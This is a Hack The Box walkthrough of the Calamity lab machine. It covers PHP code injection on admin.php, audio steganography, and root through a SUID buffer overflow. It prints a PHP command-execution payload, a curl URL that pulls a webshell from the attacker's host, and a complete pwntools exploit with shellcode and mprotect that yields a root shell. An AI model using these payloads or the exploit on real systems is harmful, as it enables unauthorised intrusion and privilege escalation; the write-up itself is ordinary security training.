---
title: "Calamity Walkthrough - HTB Hard | Audio Steganography & Binary Exploitation"
description: "Complete walkthrough of Calamity from Hack The Box. A hard Linux machine featuring PHP code injection through admin.php with password in HTML comments, enabling webshell upload for initial access. Audio steganography using Audacity invert effect on WAV files reveals user password. Privilege escalation exploits SUID binary with complex 3-stage buffer overflow: leaking hey.secret, accessing debug function, and executing shellcode after mprotect disables NX protection. One of HTB's most difficult binary exploitation challenges."
author: dua2z3rr
date: 2026-04-03 1:00:00
categories:
  - HackTheBox
  - Machines
tags: ["web-application", "vulnerability-assessment", "injections", "reverse-engineering", "steganography", "buffer-overflow", "code-injection", "php", "c", "apache", "lxd", "reconnaissance", "web-site-structure-discovery", "binary-exploitation", "exploit-development"]
image: /assets/img/calamity/calamity-resized.png
---

## Overview

Calamity, while not over challenging to an initial foothold on, is deceivingly difficult. The privilege escalation requires advanced memory exploitation, having to bypass many protections put in place.

---

## External Enumeration

### Nmap

```shell
[Apr 03, 2026 - 10:51:26 (CEST)] exegol-main calamity # ports=$(nmap -p- --min-rate=1000 -T4 10.129.14.176 2>/dev/null | grep '^[0-9]' | cut -d '/' -f1 | paste -sd ',' -); nmap -vv -p"$ports" -sC -sV 10.129.14.176 -oX calamity.xml
Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-03 10:53 CEST
<SNIP>
Nmap scan report for 10.129.14.176
Host is up, received reset ttl 63 (0.14s latency).
Scanned at 2026-04-03 10:53:19 CEST for 11s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b646319cb571c596917de46316f959a2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/EHs5E7iBHRQa5Wl/Ej8hem8p92Hw+T02W23+Svvfs48XfSdIQwcH7VVWlaGNyqjfWp+oE7LeUUdje2XlW2dkaVBqQqC+jsXhi54A4c7UHtYp2jYE1Z1HmBWU66DtDJlBFadfjNLnl9LksJxlXkMXx+pwQr+8BbHQV19SlEGHUFlgo1VxXICJFVYp73clV3c5vJXLE7PeVGgOO8aRCguVdLfaYMgZ69v9qYEn2TxeKIHC+JLEO+TsZruI4Ar0A5ogIWrBHXyM+dzq7ILY8OpPeb5Ihd2OYZMDvTDQrW7Pk/sq8Qm+jWCEV/uf/qYpWFGCDt3M2v2cPDmMdbJbdM3/
|   256 10c409b948f18c4526caf6e1c2dc36b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHBxaByQ9wnw51uAv+3FjlBgdt0sFCdSZwxmiqBKJJcyq/8es1W64FQM35Zgv3qyLMEux8BrKjU0k6wa9VWC3BE=
|   256 a8bfddc07136a82a1bea3fef66993975 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDNrIvf/rPJoBCeT2tquAQtXfGaFvuPBWCkTbQHDIH9B
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Brotherhood Software
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>
```

**Key findings:**
- Port 22: **SSH** (OpenSSH 7.2p2 Ubuntu)
- Port 80: **HTTP** (Apache httpd 2.4.18)
- Ubuntu Linux system

---

## Initial Access

### HTTP Enumeration

We find ourselves in front of this page:

![landing page](assets/img/calamity/homepage.png)

The background contains code, but it's random and doesn't really help us. Let's try fuzzing the site.

### FFUF

Fuzzing directories, subdomains, and virtual hosts leads nowhere. The /uploads folder is found, but it's empty:

```shell
[Apr 03, 2026 - 11:00:28 (CEST)] exegol-main calamity # ffuf -w /opt/lists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt:FUZZ -u http://10.129.14.176/FUZZ -ic
<SNIP>
[Status: 200, Size: 514, Words: 51, Lines: 17, Duration: 121ms]
uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 126ms]
[Status: 200, Size: 514, Words: 51, Lines: 17, Duration: 123ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 124ms]
:: Progress: [220546/220546] :: Job [1/1] :: 315 req/sec :: Duration: [0:12:08] :: Errors: 0 ::
```

However, if we add .php to our fuzzing, we find the `admin.php` page, which contains a login page:

```html
<html><body>

<form method="post">
Password: <input type="text" name="user"><br>
Username: <input type="password" name="pass">
  <input type="submit" value="Log in to the powerful administrator page">
																																																																																																																																																																																													<!-- password is:skoupidotenekes-->
</form> 
</body></html>
```

**Password found in HTML comment:** `skoupidotenekes`

Since this is a login page for the admin, you can access it with the credentials `admin:skoupidotenekes`.

### PHP Code Injection

Arriving at the new page, we see the presence of an HTML parser, and the input is taken as an argument in the URL (GET request):

![php code injection read /etc/passwd](assets/img/calamity/php-injection.png)

As shown in the photo, if we inject this parameter, we get RCE:

```php
<?php system($_GET["cmd"]); ?>
```

We can use it to get a reverse shell with netcat, but it gets closed by a script on the box. So, let's upload our own webshell. I uploaded p0wnyshell, but you can do the same with many other PHP webshells.

Here's the payload I used for the transfer to the uploads folder we saw earlier:

```
http://10.129.14.176/admin.php?html=%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E&cmd=curl%20http://10.10.15.76:8000/shell.php%20-o%20uploads/shell.php
```

Now let's visit `http://10.129.14.176/uploads/shell.php` and we get a shell as www-data:

![powny shell as www-data](assets/img/calamity/powny.png)

From here we can navigate to /home/xalvas and obtain the user flag:

```shell
www-data@calamity:…/html/uploads# cd /home


www-data@calamity:/home# ls -al
total 12
drwxr-xr-x  3 root   root   4096 Jul 13  2022 .
drwxr-xr-x 22 root   root   4096 Jul 13  2022 ..
drwxr-xr-x  7 xalvas xalvas 4096 Jul 13  2022 xalvas

www-data@calamity:/home# cd xalvas


www-data@calamity:/home/xalvas# ls -al
total 3180
drwxr-xr-x 7 xalvas xalvas    4096 Jul 13  2022 .
drwxr-xr-x 3 root   root      4096 Jul 13  2022 ..
lrwxrwxrwx 1 root   root         9 Jul 13  2022 .bash_history -> /dev/null
-rw-r--r-- 1 xalvas xalvas     220 Jun 27  2017 .bash_logout
-rw-r--r-- 1 xalvas xalvas    3790 Jun 27  2017 .bashrc
drwx------ 2 xalvas xalvas    4096 Jul 13  2022 .cache
-rw-rw-r-- 1 xalvas xalvas      43 Jun 27  2017 .gdbinit
drwxrwxr-x 2 xalvas xalvas    4096 Jul 13  2022 .nano
-rw-r--r-- 1 xalvas xalvas     655 Jun 27  2017 .profile
-rw-r--r-- 1 xalvas xalvas       0 Jun 27  2017 .sudo_as_admin_successful
drwxr-xr-x 2 xalvas xalvas    4096 Jul 13  2022 alarmclocks
drwxr-x--- 2 root   xalvas    4096 Jul 13  2022 app
-rw-r--r-- 1 root   root       225 Jun 27  2017 dontforget.txt
-rw-r--r-- 1 root   root      1424 Jul 13  2022 intrusions
drwxrwxr-x 4 xalvas xalvas    4096 Jul 13  2022 peda
-rw-r--r-- 1 xalvas xalvas 3196724 Jun 27  2017 recov.wav
-r--r--r-- 1 root   root        33 Apr  3 04:48 user.txt
```

**User flag obtained.**

---

## Lateral Movement

### Steganography

We see there are 3 audio files in the user's home directory, and 2 of these (the ones we're interested in) are WAV files: rick.wav and recov.wav.

Let's transfer these 2 files to our machine and load them into Audacity. We can use p0wnyshell's integrated commands to simplify downloading the files:

```shell
www-data@calamity:/home/xalvas# ls -al
total 3180
drwxr-xr-x 7 xalvas xalvas    4096 Jul 13  2022 .
drwxr-xr-x 3 root   root      4096 Jul 13  2022 ..
<SNIP>
-rw-r--r-- 1 xalvas xalvas 3196724 Jun 27  2017 recov.wav
-r--r--r-- 1 root   root        33 Apr  3 04:48 user.txt

www-data@calamity:/home/xalvas# download recov.wav
Done.

www-data@calamity:/home/xalvas# cd alarmclocks


www-data@calamity:…/xalvas/alarmclocks# ls -al
total 5716
drwxr-xr-x 2 xalvas xalvas    4096 Jul 13  2022 .
drwxr-xr-x 7 xalvas xalvas    4096 Jul 13  2022 ..
-rw-r--r-- 1 root   root   3196668 Jun 27  2017 rick.wav
-rw-r--r-- 1 root   root   2645839 Jun 27  2017 xouzouris.mp3

www-data@calamity:…/xalvas/alarmclocks# download rick.wav
Done.
```

Let's load the files into Audacity:

![audacity](assets/img/calamity/audacity.png)

If we then go to Effect>Special>Invert on rick.wav, we get something very interesting that you can hear below:

<audio controls> <source src="/assets/img/calamity/challenge.wav" type="audio/wav"> Your browser does not support HTML5 audio. </audio>

It's like a loop. From this we retrieve the password `18547936..*`, which sadly is not for the root user, but for xalvas.

**SSH credentials obtained:** `xalvas:18547936..*`

---

## Privilege Escalation

### Binary Exploitation

After connecting via SSH to the box with the password we just acquired, we find a file that is executed as root:

```shell
xalvas@calamity:~$ cd app
xalvas@calamity:~/app$ ls -al
total 28
drwxr-x--- 2 root   xalvas  4096 Jul 13  2022 .
drwxr-xr-x 7 xalvas xalvas  4096 Jul 13  2022 ..
-r-sr-xr-x 1 root   root   12584 Jun 29  2017 goodluck
-r--r--r-- 1 root   root    3936 Jun 29  2017 src.c
```

> This binary exploitation "challenge" is considered one of the most difficult on Hack The Box (in fact, the root blood was after about 5 days). Not having all this time available, I followed online walkthroughs, but below there will be explanations of all the steps and the theory regarding them.
{: .prompt-danger }

Let's transfer the source code with scp and analyze it:

```shell
[Apr 03, 2026 - 17:25:20 (CEST)] exegol-main calamity # scp xalvas@calamity.htb:/home/xalvas/app/src.c src.c
xalvas@calamity.htb's password:
src.c
```

Here's the binary's source code:

```c
#include <time.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <fcntl.h>
#define USIZE 12
#define ISIZE 4

  struct f {
    char user[USIZE];
    //int user;
    int secret;
    int admin;
    int session;
  }
hey;

void flushit()
{
char c;
while (( c = getchar()) != '\n' && c != EOF) { }//flush input
}

void printmaps() {

  int fd = open("/proc/self/maps", O_RDONLY);
if (fd==0) exit(1);
 unsigned char buffer[3000];//should be enough

memset(buffer, 0, sizeof buffer);
  read(fd, buffer, 2990);
close(fd);
for(int i=0;i<3000;i++)
{
if (buffer[i]>127){buffer[i]=0;break;}	//dont print too much
}

  printf("\n%s\n\n", buffer);


}

void copy(unsigned char * src, unsigned char * dst,int length) {

  FILE * ptr;

  ptr = fopen(src, "rb");
  if (ptr == 0) exit(1);
  fread(dst, length, 1, ptr); /*
HTB hint: yes you can read every file you want,
but reading a sensitive file such as shadow is not the 
intended way of sovling this,...it's just an alternative way of providing input !
tmp is not listable so other players cant see your file,unless you create a guessable file such as /tmp/bof !*/

  fclose(ptr);

}



void createusername() {
//I think  something's bad here
unsigned char for_user[ISIZE];

  printf("\nFilename:  ");

  char fn[30];
  scanf(" %28s", & fn);

flushit();
  copy(fn, for_user,USIZE);


 strncpy(hey.user,for_user,ISIZE+1);
  hey.user[ISIZE+1]=0;

}

char print() {

  char action = 0;

  printf("\n\n\t-----MENU-----\n1) leave message to admin\n2) print session ID\n3)login (admin only)\n4)change user\n5)exit\n\n action: ");
  fflush(stdout);
  scanf(" %1c", & action);
flushit();
  switch (action) {

  case '1':
    return '1';

  case '2':
    return '2';

  case '3':
    return '3';

  case '4':
    return '4';

  case '5':
    return '5';

  default:
    printf("\nplease type a number between 1 and 5\n");
    return 0;

  }


  fflush(stdout);
}

void printdeb(int deb) {
  printf("\ndebug info: 0x%x\n", deb);
}




void debug() {

  printf("\nthis function is problematic on purpose\n");
  printf("\nI'm trying to test some things...and that means get control of the program! \n");

  char vuln[64];

  printf("vulnerable pointer is at %x\n", vuln);
  printf("memory information on this binary:\n", vuln);

  printmaps();

  printf("\nFilename:  ");

  char fn[30];
  scanf(" %28s", & fn);
  flushit();
  copy(fn,vuln,100);//this shall trigger a buffer overflow

  return;

}

void attempt_login(int shouldbezero, int safety1, int safety2) {

  if (safety2 != safety1) {
    printf("hackeeerrrr");
    fflush(stdout);
	exit(666);
  }
  if (shouldbezero == 0) {
    printf("\naccess denied!\n");
    fflush(stdout);
  } else debug();

}

void printstr(char * s, int c) {
  printf("\nparam %s is %x\n", s, c);

}

int main(int argc, char * argv[]) {
asm(
"push $0x00000001\n"
"push $0x0003add6\n"
"push $0xb7e1a000\n"
"call 0x37efcd50\n"
"add $0x0c,%esp\n"


"push $0x00000005\n"
"push $0x0003a000\n"
"push $0xb7e1a000\n"
"call 0x37efcd50\n"
"add $0x0c,%esp\n"


);


  sleep(2);
 srand(time(0));
 int sess= rand();

  struct timeval tv;
  gettimeofday( & tv, NULL);

  int whoopsie=0;
  int protect = tv.tv_usec |0x01010101;//I hate null bytes...still secure !


  hey.secret = protect;
  hey.session = sess;
  hey.admin = 0;


  createusername();

  while (1) {
    char action = print();

    if (action == '1') {
      //I striped the code for security reasons !

    } else if (action == '2') {
      printdeb(hey.session);
    } else if (action == '3') {
      attempt_login(hey.admin, protect, hey.secret);
      //I'm changing the program ! you will never be to log in as admin...
      //I found some bugs that can do us a lot of harm...I'm trying to contain them but I think I'll have to
      //write it again from scratch !I hope it's completely harmless now ...
    }

    else if(action=='4')createusername();
    else if (action == '5') return;

  }

}
```

Let's check the binary's security:

```shell
[Apr 03, 2026 - 18:21:43 (CEST)] exegol-main calamity # checksec.py goodluck
Processing... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1/1 • 100.0%
Checksec Results: ELF
┏━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ File                ┃    NX     ┃    PIE    ┃     Canary     ┃      Relro       ┃    RPATH     ┃     RUNPATH      ┃     Symbols      ┃     FORTIFY      ┃      Fortified       ┃       Fortifiable        ┃        Fortify Score         ┃
┡━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━╇━━━━━━━━━━━╇━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ goodluck            │    Yes    │    Yes    │       No       │     Partial      │      No      │        No        │       Yes        │        No        │          No          │            No            │              0               │
└─────────────────────┴───────────┴───────────┴────────────────┴──────────────────┴──────────────┴──────────────────┴──────────────────┴──────────────────┴──────────────────────┴──────────────────────────┴──────────────────────────────┘
```

**Security features:**
- **NX:** Yes (stack is non-executable)
- **PIE:** Yes (Position Independent Executable)
- **Canary:** No
- **RELRO:** Partial

### Source Code Analysis

Looking at the main function:

```c
int main(int argc, char * argv[]) {
asm(
"push $0x00000001\n"
"push $0x0003add6\n"
"push $0xb7e1a000\n"
"call 0x37efcd50\n"
"add $0x0c,%esp\n"

"push $0x00000005\n"
"push $0x0003a000\n"
"push $0xb7e1a000\n"
"call 0x37efcd50\n"
"add $0x0c,%esp\n"
);
```

Let's skip the initial assembly for now. We see there are 3 variables, of which sess is generated randomly (which then becomes hey.sess) and admin (which then becomes hey.admin) is equal to 0.

Now let's look at the createusername function:

```c
void createusername() {
//I think  something's bad here
unsigned char for_user[ISIZE];

  printf("\nFilename:  ");

  char fn[30];
  scanf(" %28s", & fn);

flushit();
  copy(fn, for_user,USIZE);


 strncpy(hey.user,for_user,ISIZE+1);
  hey.user[ISIZE+1]=0;

}
```

Here we're asked for the file name and we can write up to 28 characters. Then the copy() function is called, which will read the file.

```c
void copy(unsigned char * src, unsigned char * dst,int length) {

  FILE * ptr;

  ptr = fopen(src, "rb");
  if (ptr == 0) exit(1);
  fread(dst, length, 1, ptr);

  fclose(ptr);

}
```

So, calling `copy(fn, for_user,USIZE)` will read the first 12 bytes (these values derive from the binary's global variables) and will be saved in the first 4 bytes. **This is a very small buffer overflow.** The fifth byte is set to null.

Now let's look at action number 3, which calls `attempt_login(hey.admin, protect, hey.secret)`:

```c
void attempt_login(int shouldbezero, int safety1, int safety2) {

  if (safety2 != safety1) {
    printf("hackeeerrrr");
    fflush(stdout);
    exit(666);
  }
  if (shouldbezero == 0) {
    printf("\naccess denied!\n");
    fflush(stdout);
  } else debug();

}
```

safety1 and safety2 must be equal, otherwise the program will crash. When this function is called, safety1 and safety2 are protect and hey.secret respectively. The next check is if shouldbezero (which when the function is called is hey.admin) equals 0, which won't always be. So we must overwrite hey.secret while keeping the first check false.

Here now is the most important function of all, which is called after both ifs are false, the debug() function:

```c
void debug() {

  printf("\nthis function is problematic on purpose\n");
  printf("\nI'm trying to test some things...and that means get control of the program! \n");

  char vuln[64];

  printf("vulnerable pointer is at %x\n", vuln);
  printf("memory information on this binary:\n", vuln);

  printmaps();

  printf("\nFilename:  ");

  char fn[30];
  scanf(" %28s", & fn);
  flushit();
  copy(fn,vuln,100);//this shall trigger a buffer overflow

  return;

}
```

As we see, here we have a much larger buffer overflow, because we write 100 bytes on 64. We also see the comment that tells us this.

First we see the vuln buffer is printed, giving us various information, then the previous copy function is called which reads the file we give it.

Let's review the first lines of assembly code from the main function:

```c
int main(int argc, char * argv[]) {
asm(
"push $0x00000001\n"
"push $0x0003add6\n"
"push $0xb7e1a000\n"
"call 0x37efcd50\n"
"add $0x0c,%esp\n"

"push $0x00000005\n"
"push $0x0003a000\n"
"push $0xb7e1a000\n"
"call 0x37efcd50\n"
"add $0x0c,%esp\n"
);
```

The **mprotect** function is called 2 times, which modifies permissions in certain memory areas of the stack.

### First Overflow

Here's what the stack looks like before the small overflow (the first one):

![stack](assets/img/calamity/stack.png)

**This image is from 0xdf's walkthrough**

As we see, we can overwrite 8 bytes after `for_user`. This allows us to modify EBX of main. We need main's EBX to modify where the hey struct points to. By modifying where it starts, we can modify (in a certain sense, we can't do it directly) its values.

### Complete Exploit

Here's the complete exploit, also taken from **0xdf**:

```python
#!/usr/bin/env python3

import re
from pwn import *


sshConn = ssh(host="10.10.10.27", user="xalvas", password="18547936..*")
goodluck = sshConn.process("/home/xalvas/app/goodluck")
fn = f"/tmp/{randoms(10)}"

## Stage 1 - Leak hey.secret
log.info(f'Writing Stage 1 exploit to {fn}')
sshConn.upload_data(b"A" * 8 + p32(0x80002FF8), fn)
goodluck.sendline(fn)
goodluck.recv(4096)
goodluck.sendline("2")
resp = goodluck.recv(4096).decode()
secret = re.findall(r'debug info: (0x[0-9a-f]+)', resp)[0]
log.success(f"Found secret: {secret}")

## Stage 2 - Access Debug
log.info(f'Writing Stage 2 exploit to {fn}')
sshConn.upload_data(p32(int(secret, 16)) + b'AAAA' + p32(0x80002ff4), fn)
goodluck.sendline("4")
goodluck.recv(4096)
goodluck.sendline(fn)
goodluck.recv(4096)
goodluck.sendline("3")
resp = goodluck.recvuntil(b"Filename:  ").decode()

buff_addr = int(re.search(r'vulnerable pointer is at ([0-9a-f]+)', resp).group(1), 16)
stack_start, stack_end = (int(x, 16) for x in re.search(r'\n([0-9a-f]{8})-([0-9a-f]{8}) rw-p 00000000 00:00 0          \[stack\]\n', resp).groups())
log.success(f'Address of next buffer: 0x{buff_addr}')
log.success(f'Stack address space: 0x{stack_start} - 0x{stack_end}')

## Stage 3 - Shell
mprotect = 0xb7efcd50
size = stack_end - stack_start
shellcode = asm(shellcraft.setuid(0) + shellcraft.execve('/bin/sh'))

payload =  shellcode
payload += b"A" * (76 - len(shellcode))
payload += p32(mprotect)
payload += p32(buff_addr)
payload += p32(stack_start)
payload += p32(size)
payload += p32(7)
log.info(f'Writing Stage 3 exploit to {fn}')
sshConn.upload_data(payload, fn)

goodluck.sendline(fn)
log.info(f'Cleaning up {fn}')
sshConn.unlink(fn)
goodluck.interactive(prompt='')
```

### Stage 1

First, we must read the value of `hey.secret`, because we can modify the `hey` struct, but hey.secret must be equal to protect to pass the first if.

To leak `hey.secret` we can modify the EBX register with the first buffer overflow and make it point to 8 bytes before the start of the struct. This way `hey.admin` will be equal to `hey.secret` and we can leak it with a call to printdeb().

![before and after stage1](assets/img/calamity/stage1.png)

The EBX value never changes (`0xbffff658`). Subtract 8.

### Stage 2

We want to reach the debug() function which contains the larger buffer overflow. To do this we call option number 4, and modify EBX again as before but this time 12 bytes before instead of 8.

![before and after stage 2](assets/img/calamity/stage2.png)

Now we have 2 conditions to satisfy:

- `protect == hey.secret`
- `hey.admin != 0`

We control user, so we can pass all checks and access the debug function.

### Stage 3

We must:

1. Make the stack executable (as we saw before NX is active)
2. Jump to the beginning of the vulnerable buffer and execute our shellcode

We'll build a payload like this:

1. shellcode (with setuid too)
2. junk (76 bytes, buffer offset)
3. mprotect return address

Since the program expects to read a file, we just need to put this inside our usual file and then go interactive.

### Using the Exploit

```shell
[Apr 04, 2026 - 16:44:42 (CEST)] exegol-main calamity # python3 exploit.py  
[*] Checking for new versions of pwntools  
<SNIP>
[+] Connecting to 10.129.15.31 on port 22: Done  
[*] xalvas@10.129.15.31:  
Distro    Ubuntu 16.04  
OS:       linux  
Arch:     i386  
Version:  4.4.0  
ASLR:     Disabled  
<SNIP>
[*] Writing Stage 1 exploit to /tmp/fdblqmowxq  
[+] Found secret: 0x109f561  
[*] Writing Stage 2 exploit to /tmp/fdblqmowxq  
[+] Address of next buffer: 0x3221224416  
[+] Stack address space: 0x3220041728 - 0x3221225472  
[*] Writing Stage 3 exploit to /tmp/fdblqmowxq  
[*] Cleaning up /tmp/fdblqmowxq  
[*] Switching to interactive mode   
# whoami  
root  
# cd /root; ls -al  
total 40  
drwx------  5 root root 4096 Apr  4 10:41 .  
drwxr-xr-x 22 root root 4096 Jul 13  2022 ..  
<SNIP>
-r--------  1 root root   33 Apr  4 10:41 root.txt  
-rwxr-xr-x  1 root root  897 Jun 28  2017 scr
```

**Root flag obtained.** Box completed.

---

## Reflections

### What Surprised Me

The stark contrast between the easy user flag (simple PHP code injection with password in HTML comment) and the extremely difficult root flag (complex 3-stage buffer overflow) was unexpected for a Hard box. Audio steganography is rarely seen in HTB boxes. The Audacity invert effect on rick.wav to reveal the password was creative and unusual. The binary exploitation complexity was painful: the root blood being after approximately 5 days demonstrates this was one of HTB's most challenging binary exploitations, requiring deep understanding of EBX manipulation, struct pointer modification, and mprotect to disable NX.

### Main Mistake

It took me a while to arrive at the solution of inverting rick.wav. I tried various steganography techniques before discovering the correct approach. The binary exploitation difficulty was overwhelming. Not having unlimited time, I followed online walkthroughs rather than solving it independently, though I thoroughly studied each stage to understand the exploitation mechanics. I should have recognized the lxd group membership earlier as an alternative path, though the binary exploitation was clearly the intended and more educational route.

### Alternative Approaches

The unintended lxd group exploitation could create privileged containers mounting the host filesystem, completely bypassing binary exploitation.

### Open Question

How common is audio steganography in CTF competitions compared to HTB? The Audacity invert technique is clever but relatively obscure. Is this level of steganography knowledge expected, or is it frustrating trial-and-error? 

---

**Completed this box? Did you solve the binary exploitation or use the lxd method?** Leave a comment down below!
